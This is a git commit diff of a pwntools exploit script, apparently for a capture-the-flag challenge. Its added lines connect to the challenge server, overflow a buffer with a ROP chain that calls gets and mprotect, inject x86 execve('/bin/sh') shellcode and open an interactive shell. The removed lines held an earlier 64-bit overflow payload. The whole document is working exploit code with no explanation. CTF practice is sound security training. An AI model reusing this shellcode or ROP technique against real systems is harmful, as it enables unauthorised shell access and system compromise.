84957d31da273f6cb4618a00edf63d91d248584f
Jung daan <gong3gong@gmail.com>
2019-08-18 17:05:42 +0900

    asdf

--- p.py
+++ p.py
@@ -1,14 +1,24 @@
 from pwn import *
 
-r=remote("ctf.j0n9hyun.xyz",3016)
+r = remote ("ctf.j0n9hyun.xyz", 3017)
+sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+print r.recvline()
 
-payload = "A"*40
-payload += p64(0x601068)
+get = 0x804f120
+put = 0x80bb328
 
-#pause()
+payload = "a"*28
+payload += p32(get)
+payload += p32(0x80bb0b8)
+payload += p32(0x80eaf80)
+payload += p32(0x080488a3)
+payload += p32(0x806e0f0)
+payload += p32(0x80bacfe)
+payload += p32(0x80ea000)
+payload += p32(8000)
+payload += p32(7)
+payload += p32(0x80eaf80)
 r.sendline(payload)
 
-payload =p64(0x400826)
-r.sendline(payload)
-
+r.sendline(sc)
 r.interactive()
